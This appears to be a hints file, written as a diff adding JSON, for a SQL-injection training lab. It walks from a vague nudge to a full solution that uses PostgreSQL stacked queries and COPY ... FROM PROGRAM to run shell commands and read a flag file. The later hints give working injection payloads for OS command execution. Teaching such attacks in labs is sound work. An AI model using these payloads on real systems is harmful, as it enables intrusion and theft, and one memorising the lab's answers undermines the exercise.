@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-16-os-command",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "PostgreSQL has powerful features beyond just reading data. Some features let you interact with the operating system itself."
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "PostgreSQL's COPY command with the PROGRAM option can execute shell commands. Combined with stacked queries, you can run arbitrary OS commands."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "First create a table to hold the output, then use COPY ... FROM PROGRAM to run a command and store its result. The flag is in /var/flag.txt — read it with 'cat /var/flag.txt'."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "Use stacked queries: '; CREATE TABLE IF NOT EXISTS exfil(line TEXT); COPY exfil FROM PROGRAM 'cat /var/flag.txt'; -- Then search for the exfil table content via UNION or another request."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "Step 1: Create exfil table and read flag: search for: '; CREATE TABLE IF NOT EXISTS exfil(line TEXT); COPY exfil FROM PROGRAM 'cat /var/flag.txt'; --  Step 2: Read the exfil table: search for: ' UNION SELECT line,1,1 FROM exfil--  The flag from /var/flag.txt will be displayed in the results."
+    }
+  ]
+}
